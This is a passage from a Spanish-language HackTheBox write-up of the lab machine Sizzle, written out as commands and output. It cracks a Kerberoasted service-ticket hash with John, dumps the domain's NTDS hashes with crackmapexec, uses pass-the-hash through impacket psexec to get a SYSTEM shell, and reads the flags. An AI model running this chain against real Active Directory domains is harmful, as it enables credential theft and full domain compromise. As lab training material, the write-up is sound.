                             7DE4F326B7F1E79F666F2D448AE3DB13CAA1B471EF8F4172ABBE3AD78E20F3E86998C5C0B36F3EB3
                             46C4465C886DEDED3BCCC113B0CD4D2B6D331DBCB2D483887CA9195E46DE95DA6368D9F4834BA9D4
                             B25AFF4BDE9FCFF7FE0D4487080CA35487DE4A4AB316492A6534EA7E5BACC67EA6893E1C2C154DBB
                             2CDCB44E43C846A48533EAC21FDC38CF020B72DA506D2D2B2ACF2053DB2F82A699C07B29999E596D
                             EEB3DF46DD18ED0BDDAAC3068DD84887D0248352D24F9F15A76C7AE9015408A18B67649A48B0D056
                             4409DFC2B6695E083AAE400942508E4E6E1082505BBD6082F4185C110B5CBB596A2C426578609E69
                             C02410F432981DD4B
```

Almaceno el hash en un archivo, borrando los saltos de línea y lo crackeo con john

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:05 DONE (2023-01-20 14:01) 0.1779g/s 1987Kp/s 1987Kc/s 1987KC/s Forever3!..Flubb3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Con crackmapexec, dumpeo todos los hashes NT del directorio activo

```null
crackmapexec smb 10.10.10.103 -u 'mrlky' -p 'Football#7' --ntds
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\mrlky:Football#7 
SMB         10.10.10.103    445    SIZZLE           [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.10.10.103    445    SIZZLE           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.103    445    SIZZLE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
SMB         10.10.10.103    445    SIZZLE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
SMB         10.10.10.103    445    SIZZLE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
SMB         10.10.10.103    445    SIZZLE           mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
SMB         10.10.10.103    445    SIZZLE           sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SMB         10.10.10.103    445    SIZZLE           SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:965424862ff18d76a5b9d9bf3b1eed36:::
SMB         10.10.10.103    445    SIZZLE           [+] Dumped 8 NTDS hashes to /root/.cme/logs/SIZZLE_10.10.10.103_2023-01-20_140303.ntds of which 7 were added to the database
```

Teniendo el hash NT del usuario Administrador, puedo hacer PassTheHash con impacket-psexec y obtener una consola interactiva

```null
psexec.py htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.103.....
[*] Found writable share ADMIN$
[*] Uploading file RhGSeeeh.exe
[*] Opening SVCManager on 10.10.10.103.....
[*] Creating service IAFc on 10.10.10.103.....
[*] Starting service IAFc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

Y puedo visualizar las dos flags

```null
C:\Windows\system32> type C:\Users\mrlky\Desktop\user.txt
ab995cabf5ec48ade4fd06fa1e14a6c7
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
6178f3b1ebc110468a41c8db2cc032c3
```